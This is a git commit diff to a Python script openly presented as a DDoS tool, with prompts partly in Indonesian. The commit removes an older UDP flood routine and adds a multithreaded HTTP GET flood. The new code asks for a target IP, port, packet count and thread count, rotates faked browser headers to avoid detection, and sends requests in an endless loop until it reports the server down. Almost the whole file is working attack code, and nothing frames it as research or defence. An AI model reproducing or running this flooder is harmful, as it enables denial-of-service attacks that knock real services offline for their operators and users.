42b6022c929f9d123b21da85b6c5b7144ffb91fd
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-24 10:25:16 +0300

    Update ddosvip.py

--- ddosvip.py
+++ ddosvip.py
@@ -11,6 +11,9 @@ import string
 import turtle
 import optparse
 from turtle import clear
+import socket, requests
+import random
+import threading
 #----------------------------------------------------------------------#
 def ddos():
     print()
@@ -24,63 +27,63 @@ def ddos():
     print ("MASUKAN IP DARI WIFI YANG ANDA INGIN SERANG")
     print ()
 #----------------------------------------------------------------------#
-def put():
-    print("--------------------------------------------------------------------------")
-print('''
-  888888ba  888888ba   .88888.  .d88888b       dP     dP dP  888888ba  
-  88    `8b 88    `8b d8'   `8b 88.    "'      88     88 88  88    `8b 
-  88     88 88     88 88     88 `Y88888b.      88    .8P 88 a88aaaa8P' 
-  88     88 88     88 88     88       `8b 8888 88     d8 88  88        
-  88    .8P 88    .8P Y8.   .8P d8'   .8P      88    d8  88  88        
-  8888888P  8888888P   `8888P'   Y88888P         8888'   dP  dP        
-ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo ''')
-print()
-print("DDOS WIFI TOOLS BY YONATHAN GM")
-print("===================================")
-print("TYPE [gas] TO START THE PROGRAM ")
-print()
-put=input("INPUT : ")
 
-if put == "gas":
-        os.system('cls')
-        ddos()
-        x = input("IP : ")
-        print("-------------------------------------------------------------")
-        print("MASUKAN PORT WIFI ANDA (CONTOH : 80)")
-        print()
-        y = input("PORT : ")
-        print("-------------------------------------------------------------")
-        print("MASUKAN PAKET YANG ANDA KIRIM KE WIFI TUJUAN (MAXIMAL 1000)")
-        print()
-        z = input("PACKET: ")
 
-#-------------------------------------------------------------#
-def usage():
-    print ()
-#-------------------------------------------------------------#
-def flood(victim, vport, duration):
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(20000)
-    timeout =  time.time() + duration
-    sent = 3000
+useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
+ref=['http://www.bing.com/search?q=',
+'https://www.yandex.com/yandsearch?text=',
+'https://duckduckgo.com/?q=']
+acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept-Encoding: gzip, deflate\r\n",
+"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+"Accept-Language: en-US,en;q=0.5\r\n"]
 
-    while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        client.sendto(bytes, (victim, vport))
-        sent = sent + 1
-        print ("ENTODDDDDDDD !!!")
-#-------------------------------------------------------------#
-def main():
-    try:
-          print (len(sys.argv))
-          if len(sys.argv) != 4:
-             usage()
-          else:
-             flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-    except IndexError:
-          sys.exit("CRROOTTTTTTT !!!")
-if __name__ == '__main__':
-    main()
+ip = str(input('[+] Target: => '))
+port = int(input('[+] Port: => '))
+pack = int(input('[+] Packet/s: => '))
+thread = int(input('[+] Threads: => '))
+def start():
+    global useragents, ref, acceptall
+    hh = random._urandom(3016)
+    xx = int(0)
+    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
+    accept = random.choice(acceptall)
+    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
+    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_req))
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, int(pack))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+        except:
+            s.close()
+            print('[+] Server Down.')
+
+for x in range(thread):
+    thred = threading.Thread(target=start)
+    thred.start()
